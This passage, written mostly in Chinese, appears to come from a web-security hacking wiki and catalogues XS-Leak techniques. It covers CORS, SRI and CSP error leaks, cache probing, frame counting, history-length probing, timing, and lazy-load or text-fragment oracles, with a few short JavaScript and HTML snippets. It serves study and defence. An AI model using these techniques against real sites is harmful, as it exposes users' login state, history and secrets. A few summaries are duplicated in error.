- **总结:** 在安全声明 (SA) 中，CORS 错误消息无意中暴露了重定向请求的完整 URL。
- **代码示例**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

此技术使攻击者能够通过利用 Webkit 基于浏览器处理 CORS 请求的方式来**提取跨源站点重定向的目标**。具体而言，当向一个基于用户状态发出重定向的目标站点发送**CORS 启用请求**时，如果浏览器随后拒绝该请求，则**重定向目标的完整 URL**会在错误消息中披露。此漏洞不仅揭示了重定向的事实，还暴露了重定向的端点及其可能包含的任何**敏感查询参数**。

### SRI 错误

- **包含方法**: Fetch API
- **可检测差异**: Header
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **总结:** 在安全声明 (SA) 中，CORS 错误消息无意中暴露了重定向请求的完整 URL。
- **代码示例**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

攻击者可以利用**详细的错误消息**来推断跨源响应的大小。这是由于子资源完整性 (SRI) 的机制，该机制使用完整性属性来验证从 CDN 获取的资源是否未被篡改。为了使 SRI 在跨源资源上工作，这些资源必须是**CORS 启用的**；否则，它们不受完整性检查。在安全声明 (SA) 中，与 CORS 错误 XS-Leak 类似，错误消息可以在带有完整性属性的 fetch 请求失败后被捕获。攻击者可以故意**触发此错误**，通过将**虚假的哈希值**分配给任何请求的完整性属性。在 SA 中，结果错误消息无意中揭示了请求资源的内容长度。这一信息泄露使攻击者能够识别响应大小的变化，为复杂的 XS-Leak 攻击铺平了道路。

### CSP 违规/检测

- **包含方法**: 弹出窗口
- **可检测差异**: 状态码
- **更多信息**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **总结:** 如果我们访问的受害者网站尝试重定向到不同的域，CSP 将触发可检测的错误。
- **代码示例**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak 可以使用 CSP 检测跨源站点是否重定向到不同的源。此泄漏可以检测重定向，但此外，重定向目标的域也会泄漏。此攻击的基本思路是**在攻击者站点上允许目标域**。一旦向目标域发出请求，它**重定向**到一个跨源域。**CSP 阻止**对其的访问并创建一个**违规报告作为泄漏技术**。根据浏览器的不同，**此报告可能泄漏重定向的目标位置**。\
现代浏览器不会指示重定向到的 URL，但您仍然可以检测到跨源重定向已被触发。

### 缓存

- **包含方法**: 框架, 弹出窗口
- **可检测差异**: 页面内容
- **更多信息**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **总结:** 从缓存中清除文件。打开目标页面检查文件是否存在于缓存中。
- **代码示例:**

浏览器可能为所有网站使用一个共享缓存。无论其来源如何，都可以推断目标页面是否**请求了特定文件**。

如果一个页面仅在用户登录时加载图像，您可以**使资源失效**（以便如果它被缓存则不再缓存，更多信息链接），**执行一个请求**，该请求可能加载该资源，并尝试使用**错误请求**加载该资源（例如，使用过长的 referer 头）。如果资源加载**没有触发任何错误**，则是因为它被**缓存**。

### CSP 指令

- **包含方法**: 框架
- **可检测差异**: Header
- **更多信息**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **总结:** CSP 头指令可以通过 CSP iframe 属性进行探测，揭示策略细节。
- **代码示例**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome (GC) 中的一个新功能允许网页通过在 iframe 元素上设置属性来**提议内容安全策略 (CSP)**，并将策略指令与 HTTP 请求一起传输。通常，嵌入的内容必须**通过 HTTP 头进行授权**，否则将显示**错误页面**。然而，如果 iframe 已经受到 CSP 的管理，并且新提议的策略不更严格，则页面将正常加载。此机制为攻击者打开了一条路径，通过识别错误页面来**检测跨源页面的特定 CSP 指令**。尽管此漏洞被标记为已修复，但我们的发现揭示了一种**新的泄漏技术**，能够检测错误页面，表明根本问题从未完全解决。

### **CORP**

- **包含方法**: Fetch API
- **可检测差异**: Header
- **更多信息**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **总结:** 使用跨源资源策略 (CORP) 保护的资源在从不允许的源获取时会抛出错误。
- **代码示例**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP 头是一个相对较新的网络平台安全功能，当设置时**阻止对给定资源的无 CORS 跨源请求**。可以检测到该头的存在，因为受 CORP 保护的资源在被获取时会**抛出错误**。

### CORB

- **包含方法**: HTML 元素
- **可检测差异**: Headers
- **更多信息**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **总结**: CORB 可以允许攻击者检测请求中是否存在**`nosniff` 头**。
- **代码示例**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

查看链接以获取有关攻击的更多信息。

### 在原点反射错误配置上的 CORS 错误 <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **包含方法**: Fetch API
- **可检测差异**: Headers
- **更多信息**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **总结**: 如果 Origin 头在 `Access-Control-Allow-Origin` 头中被反射，则可以检查资源是否已经在缓存中。
- **代码示例**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

如果**Origin 头**在 `Access-Control-Allow-Origin` 头中被**反射**，攻击者可以利用此行为尝试在**CORS** 模式下**获取**该**资源**。如果**没有**触发**错误**，则意味着它是**正确地从网络中检索**的；如果触发了错误，则是因为它是**从缓存中访问的**（错误出现是因为缓存保存了一个带有允许原始域而不是攻击者域的 CORS 头的响应）。\
请注意，如果原点没有被反射，但使用了通配符 (`Access-Control-Allow-Origin: *`)，则此方法将无效。

## 可读属性技术

### Fetch 重定向

- **包含方法**: Fetch API
- **可检测差异**: 状态码
- **更多信息**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **总结:** GC 和 SA 允许在重定向完成后检查响应的类型 (opaque-redirect)。
- **代码示例**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

使用 Fetch API 提交请求，设置 `redirect: "manual"` 和其他参数，可以读取 `response.type` 属性，如果它等于 `opaqueredirect`，则响应是一个重定向。

### COOP

- **包含方法**: 弹出窗口
- **可检测差异**: Header
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **总结:** 受跨源打开者策略 (COOP) 保护的页面防止跨源交互的访问。
- **代码示例**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

攻击者能够推断跨源 HTTP 响应中跨源打开者策略 (COOP) 头的存在。COOP 被网络应用程序用于阻止外部站点获取任意窗口引用。可以通过尝试访问**`contentWindow` 引用**来识别此头的可见性。在 COOP 有条件应用的情况下，**`opener` 属性**成为一个明显的指示器：当 COOP 活动时，它是**未定义的**，而在没有 COOP 的情况下则是**定义的**。

### URL 最大长度 - 服务器端

- **包含方法**: Fetch API, HTML 元素
- **可检测差异**: 状态码 / 内容
- **更多信息**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **总结:** 检测响应中的差异，因为重定向响应长度可能过大，服务器会回复错误并生成警报。
- **代码示例**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

如果服务器端重定向使用**用户输入进行重定向**和**额外数据**。可以检测到这种行为，因为通常**服务器**有一个**请求长度限制**。如果**用户数据**是**长度 - 1**，因为**重定向**使用**该数据**并**添加**一些**额外**内容，它将触发一个**可通过错误事件检测到的错误**。

如果您可以以某种方式将 cookies 设置给用户，您还可以通过**设置足够的 cookies**（[**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)）来执行此攻击，因此**正确响应**的**响应大小**增加会触发一个**错误**。在这种情况下，请记住，如果您从同一站点触发此请求，`<script>` 将自动发送 cookies（因此您可以检查错误）。\
有关**cookie bomb + XS-Search**的示例可以在此写作的意图解决方案中找到：[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` 或处于相同上下文通常是此类攻击所需的。

### URL 最大长度 - 客户端

- **包含方法**: 弹出窗口
- **可检测差异**: 状态码 / 内容
- **更多信息**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **总结:** 检测响应中的差异，因为重定向响应长度可能过大，以至于可以注意到差异。
- **代码示例**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

根据 [Chromium 文档](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length)，Chrome 的最大 URL 长度为 2MB。

> 一般来说，_web 平台_ 对 URL 的长度没有限制（尽管 2^31 是一个常见限制）。_Chrome_ 将 URL 限制为最大长度 **2MB**，出于实际原因并避免在进程间通信中造成拒绝服务问题。

因此，如果**重定向 URL 的响应在某些情况下更大**，则可以使其重定向到**大于 2MB 的 URL**以达到**长度限制**。当发生这种情况时，Chrome 会显示一个**`about:blank#blocked`** 页面。

**显著差异**是，如果**重定向**已**完成**，`window.origin` 会抛出一个**错误**，因为跨源无法访问该信息。然而，如果**限制**被****触发并且加载的页面是**`about:blank#blocked`**，则窗口的**`origin`** 保持为**父级**的值，这是一个**可访问的信息**。

所有达到**2MB**所需的额外信息可以通过初始 URL 中的**哈希**添加，以便在重定向中**使用**。

{{#ref}}
url-max-length-client-side.md
{{#endref}}

### 最大重定向

- **包含方法**: Fetch API, 框架
- **可检测差异**: 状态码
- **更多信息**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **总结:** 利用浏览器的重定向限制来确定 URL 重定向的发生。
- **代码示例**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

如果浏览器的**最大**重定向次数为**20**，攻击者可以尝试用**19 次重定向**加载他的页面，最后**将受害者**发送到测试页面。如果触发了**错误**，则表示页面试图**重定向受害者**。

### 历史长度

- **包含方法**: 框架, 弹出窗口
- **可检测差异**: 重定向
- **更多信息**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **总结:** JavaScript 代码操纵浏览器历史，可以通过长度属性访问。
- **代码示例**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**历史 API** 允许 JavaScript 代码操纵浏览器历史，**保存用户访问的页面**。攻击者可以使用长度属性作为包含方法：检测 JavaScript 和 HTML 导航。\
**检查 `history.length`**，使用户**导航**到一个页面，**返回**到同源并**检查**新值的**`history.length`**。

### 使用相同 URL 的历史长度

- **包含方法**: 框架, 弹出窗口
- **可检测差异**: 如果 URL 与猜测的 URL 相同
- **总结:** 可以通过操纵历史长度来猜测框架/弹出窗口的位置是否在特定 URL 中。
- **代码示例**: 以下

攻击者可以使用 JavaScript 代码**操纵框架/弹出窗口的位置到猜测的 URL**，并**立即**将其**更改为 `about:blank`**。如果历史长度增加，则意味着 URL 是正确的，并且有时间**增加，因为如果 URL 相同则不会重新加载**。如果没有增加，则意味着它**尝试加载猜测的 URL**，但因为我们**立即之后**加载了**`about:blank`**，所以**历史长度在加载猜测的 URL 时从未增加**。
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: 页面内容
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** 通过检查 `window.length` 属性评估 iframe 元素的数量。
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

计算通过 `iframe` 或 `window.open` 打开的 **网页中的帧数** 可能有助于识别 **用户在该页面上的状态**。\
此外，如果页面始终具有相同数量的帧，**持续** 检查帧数可能有助于识别可能泄露信息的 **模式**。

这种技术的一个例子是，在 Chrome 中，**PDF** 可以通过 **帧计数** 被 **检测**，因为内部使用了 `embed`。有一些 [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) 允许对内容进行一些控制，例如 `zoom`、`view`、`page`、`toolbar`，在这种情况下，这种技术可能会很有趣。

### HTMLElements

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: 页面内容
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** 读取泄露的值以区分两种可能的状态
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

通过 HTML 元素的信息泄露是网络安全中的一个问题，特别是当动态媒体文件基于用户信息生成时，或者当添加水印时，改变媒体大小。攻击者可以利用这一点，通过分析某些 HTML 元素暴露的信息来区分可能的状态。

### Information Exposed by HTML Elements

- **HTMLMediaElement**: 此元素揭示媒体的 `duration` 和 `buffered` 时间，可以通过其 API 访问。[Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: 它暴露 `videoHeight` 和 `videoWidth`。在某些浏览器中，像 `webkitVideoDecodedByteCount`、`webkitAudioDecodedByteCount` 和 `webkitDecodedFrameCount` 等附加属性可用，提供有关媒体内容的更深入信息。[Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: 此函数提供有关视频播放质量的详细信息，包括 `totalVideoFrames`，这可以指示处理的视频数据量。[Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: 此元素泄露图像的 `height` 和 `width`。但是，如果图像无效，这些属性将返回 0，并且 `image.decode()` 函数将被拒绝，指示未能正确加载图像。[Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: 页面内容
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** 识别与用户状态或身份相关的网站样式变化。
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web 应用程序可能会根据用户的状态更改 **网站样式**。跨域 CSS 文件可以通过 **HTML link 元素** 嵌入到攻击者页面中，**规则** 将被 **应用** 到攻击者页面。如果页面动态更改这些规则，攻击者可以根据用户状态 **检测** 这些 **差异**。\
作为一种泄露技术，攻击者可以使用 `window.getComputedStyle` 方法来 **读取特定 HTML 元素的 CSS** 属性。因此，如果已知受影响的元素和属性名称，攻击者可以读取任意 CSS 属性。

### CSS History

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: 页面内容
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** 检测 `:visited` 样式是否应用于 URL，指示其已被访问
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> 根据 [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)，在无头 Chrome 中此方法无效。

CSS `:visited` 选择器用于对用户之前访问过的 URL 进行不同的样式处理。过去，可以使用 `getComputedStyle()` 方法来识别这些样式差异。然而，现代浏览器已实施安全措施，以防止此方法揭示链接的状态。这些措施包括始终返回计算样式，仿佛链接已被访问，并限制可以使用 `:visited` 选择器应用的样式。

尽管有这些限制，但可以间接识别链接的访问状态。一种技术涉及诱使用户与受 CSS 影响的区域进行交互，特别是利用 `mix-blend-mode` 属性。该属性允许元素与其背景混合，可能根据用户交互揭示访问状态。

此外，可以通过利用链接的渲染时间来实现无用户交互的检测。由于浏览器可能以不同方式渲染已访问和未访问的链接，这可能在渲染中引入可测量的时间差。Chromium 错误报告中提到了一种概念验证 (PoC)，演示了使用多个链接来放大时间差，从而通过时间分析使访问状态可检测。

有关这些属性和方法的更多详细信息，请访问其文档页面：

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Headers
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** 在 Google Chrome 中，当由于 X-Frame-Options 限制而阻止页面嵌入到跨域站点时，会显示专用错误页面。
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

在 Chrome 中，如果一个设置了 `X-Frame-Options` 头为 "deny" 或 "same-origin" 的页面作为对象嵌入，则会出现错误页面。Chrome 独特地为该对象的 `contentDocument` 属性返回一个空文档对象（而不是 `null`），这与在 iframe 或其他浏览器中的表现不同。攻击者可以通过检测空文档来利用这一点，可能揭示有关用户状态的信息，特别是如果开发人员不一致地设置 X-Frame-Options 头，通常会忽略错误页面。意识到并一致应用安全头对于防止此类泄露至关重要。

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** 攻击者可以通过利用 iframe 来识别文件下载；iframe 的持续可访问性意味着文件下载成功。
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` 头，特别是 `Content-Disposition: attachment`，指示浏览器下载内容而不是内联显示。这种行为可以被利用来检测用户是否可以访问触发文件下载的页面。在基于 Chromium 的浏览器中，有几种技术可以检测这种下载行为：

1. **下载栏监控**：
- 当在基于 Chromium 的浏览器中下载文件时，浏览器窗口底部会出现下载栏。
- 通过监控窗口高度的变化，攻击者可以推断下载栏的出现，表明下载已启动。
2. **使用 Iframe 的下载导航**：
- 当页面使用 `Content-Disposition: attachment` 头触发文件下载时，它不会引起导航事件。
- 通过在 iframe 中加载内容并监控导航事件，可以检查内容处置是否导致文件下载（无导航）或不是。
3. **不使用 Iframe 的下载导航**：
- 与 iframe 技术类似，此方法涉及使用 `window.open` 而不是 iframe。
- 监控新打开窗口中的导航事件可以揭示是否触发了文件下载（无导航）或内容是否内联显示（发生导航）。

在只有登录用户可以触发此类下载的情况下，这些技术可以用来间接推断用户的身份验证状态，基于浏览器对下载请求的响应。

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** 攻击者可以通过利用 iframe 来识别文件下载；iframe 的持续可访问性意味着文件下载成功。
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (来自 [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> 这就是为什么这个技术很有趣：Chrome 现在有 **缓存分区**，新打开页面的缓存键是：`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`，但是如果我打开一个 ngrok 页面并在其中使用 fetch，缓存键将是：`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`，**缓存键是不同的**，因此缓存不能共享。您可以在这里找到更多细节：[通过分区缓存获得安全性和隐私](https://developer.chrome.com/blog/http-cache-partitioning/)\
> （来自 [**这里**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) 的评论）

如果一个站点 `example.com` 包含来自 `*.example.com/resource` 的资源，那么该资源将具有与通过顶级导航直接 **请求** 该资源时 **相同的缓存键**。这是因为缓存键由顶级 _eTLD+1_ 和框架 _eTLD+1_ 组成。

因为访问缓存比加载资源更快，所以可以尝试更改页面的位置并在 20 毫秒（例如）后取消它。如果在停止后更改了源，则意味着资源已被缓存。\
或者可以 **发送一些 fetch 到潜在缓存页面并测量所需时间**。

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirects
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** 可以找出 fetch 请求的响应是否为重定向
- **Code Example**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Summary:** 可以尝试加载资源并在加载之前中断加载。根据是否触发错误，资源可能已被缓存或未被缓存。
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

使用 _**fetch**_ 和 _**setTimeout**_ 结合 **AbortController** 来检测 **资源是否被缓存** 并将特定资源从浏览器缓存中驱逐。此外，该过程在不缓存新内容的情况下进行。

### Script Pollution

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: 页面内容
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** 可以 **覆盖内置函数** 并读取其参数，即使是来自 **跨域脚本**（无法直接读取），这可能 **泄露有价值的信息**。
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: 页面内容
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** 测量使用服务工作者的网页的执行时间。
- **Code Example**:

在给定的场景中，攻击者主动在其域名之一 "attacker.com" 中注册一个 **服务工作者**。接下来，攻击者从主文档中在目标网站打开一个新窗口，并指示 **服务工作者** 开始计时。当新窗口开始加载时，攻击者将前一步获得的引用导航到由 **服务工作者** 管理的页面。

在前一步发起的请求到达时，**服务工作者** 以 **204 (No Content)** 状态码响应，有效地终止导航过程。此时，**服务工作者** 捕获从第二步开始的计时器的测量。该测量受 JavaScript 导致的导航过程延迟的影响。

> [!WARNING]
> 在执行计时中，可以 **消除** **网络因素** 以获得 **更精确的测量**。例如，通过在加载页面之前加载页面使用的资源。

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing (通常由于页面内容、状态码)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** 使用 [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) 测量执行请求所需的时间。可以使用其他时钟。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing (通常由于页面内容、状态码)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** 使用 [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) 测量使用 `window.open` 执行请求所需的时间。可以使用其他时钟。
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)


## With HTML or Re Injection

在这里，您可以找到从跨域 HTML **注入 HTML 内容** 中提取信息的技术。这些技术在您可以 **注入 HTML 但无法注入 JS 代码** 的情况下很有趣。

### Dangling Markup

{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

如果您需要 **提取内容** 并且可以 **在秘密之前添加 HTML**，您应该检查 **常见的悬挂标记技术**。\
但是，如果出于某种原因您 **必须** 逐字符进行（也许通信是通过缓存命中），您可以使用这个技巧。

**图像** 在 HTML 中具有一个 "**loading**" 属性，其值可以是 "**lazy**"。在这种情况下，图像将在被查看时加载，而不是在页面加载时：
```html
<img src=/something loading=lazy >
```
因此，您可以做的是**添加大量垃圾字符**（例如**成千上万个"W"**）来**填充网页在秘密之前，或者添加类似**`<br><canvas height="1850px"></canvas><br>`**的内容。\
然后，如果例如我们的**注入出现在标志之前**，**图像**将被**加载**，但如果出现在**标志之后**，标志 + 垃圾将**阻止其加载**（您需要调整放置多少垃圾）。这就是在[**这篇文章**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/)中发生的情况。

另一个选项是使用**scroll-to-text-fragment**（如果允许的话）：

#### Scroll-to-text-fragment

但是，您让**机器人访问页面**时使用类似
```
#:~:text=SECR
```
所以网页将类似于：**`https://victim.com/post.html#:~:text=SECR`**

其中 post.html 包含攻击者的垃圾字符和懒加载图像，然后添加机器人的秘密。

这段文本的作用是让机器人访问页面中包含文本 `SECR` 的任何文本。由于该文本是秘密，并且它就在 **图像下方**，因此 **只有在猜测的秘密正确时，图像才会加载**。所以你就有了你的神谕来 **逐字符提取秘密**。

